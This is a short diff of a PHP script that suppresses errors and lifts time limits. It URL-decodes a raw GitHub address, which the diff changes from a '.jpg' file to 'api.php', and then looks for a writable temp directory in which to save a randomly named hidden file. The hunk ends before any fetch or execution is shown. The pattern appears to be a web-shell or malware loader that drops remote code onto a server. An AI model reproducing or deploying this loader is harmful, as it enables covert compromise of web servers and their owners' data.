@@ -2,11 +2,11 @@
 error_reporting(0);ini_set('display_errors',0);set_time_limit(0);
 
 // URL encoded
-$url = 'https%3A%2F%2Fraw.githubusercontent.com%2Ftikung6etar%2FNyarek%2Frefs%2Fheads%2Fmaster%2Fxmin.jpg';
+$url = 'https%3A%2F%2Fraw.githubusercontent.com%2Ftikung6etar%2FNyarek%2Frefs%2Fheads%2Fmaster%2Fapi.php';
 $url = rawurldecode($url);
 
 // cari writable
-$dirs=array('/var/tmp/','/home/','/tmp/','/dev/shm/','./');$save='';foreach($dirs as $d){if(@is_writable($d)){$save=$d;break;}}if(empty($save)){$save='/tmp/';}
+$dirs=array('/var/tmp/', '/var/tmp/lock/','/home/','/tmp/','/dev/shm/','./');$save='';foreach($dirs as $d){if(@is_writable($d)){$save=$d;break;}}if(empty($save)){$save='/tmp/';}
 $fname='.'.md5(rand().time()).'.tmp';$fpath=$save.$fname;
 
 $data='';
